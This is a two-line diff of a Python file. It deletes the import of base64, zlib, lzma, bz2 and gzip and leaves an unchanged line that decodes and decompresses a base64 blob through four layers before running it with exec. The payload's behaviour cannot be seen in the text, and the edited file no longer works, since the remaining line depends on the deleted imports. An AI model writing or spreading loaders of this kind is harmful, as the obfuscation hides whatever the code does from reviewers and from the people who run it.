@@ -1,2 +1,2 @@
-import base64, zlib, lzma, bz2, gzip
+
 exec((lambda uaXsf:compile(uaXsf,'<string>','exec'))(zlib.decompress(lzma.decompress(bz2.decompress(gzip.decompress(base64.b64decode("H4sIAEtP6WYC/wEAAf/+QlpoOTFBWSZTWZVBBBAAAFf///aqFXAghKmVkXqccJHcZHbUKogXmoEkDIR3+1MfhBsLoACUHNIw1PSYEMQwJkyaPSYQZo0BonqZ6kwQ8KD0E2QntDUKjUAGgAADQAAAA0ANAAAAAAABSBEOwQgcCiJhQFzAWgoBiUpBX2OEHDesIrKb6lA8XAX8xisgfSSRHMndtWouYRbsJufhAr6UULOvAINuQQU/Q1FZFL9NMtvgzZw1ObkDf/DzjRzhiBlNLGsnMD3+RyFc2rP/pgP4NhMrQolA2LJCj6dfCJUvOIKYiVlQv0ALOF3twpkF2wgJugwu0FvF3JFOFCQlUEEEADw3A7IAAQAA")))))))
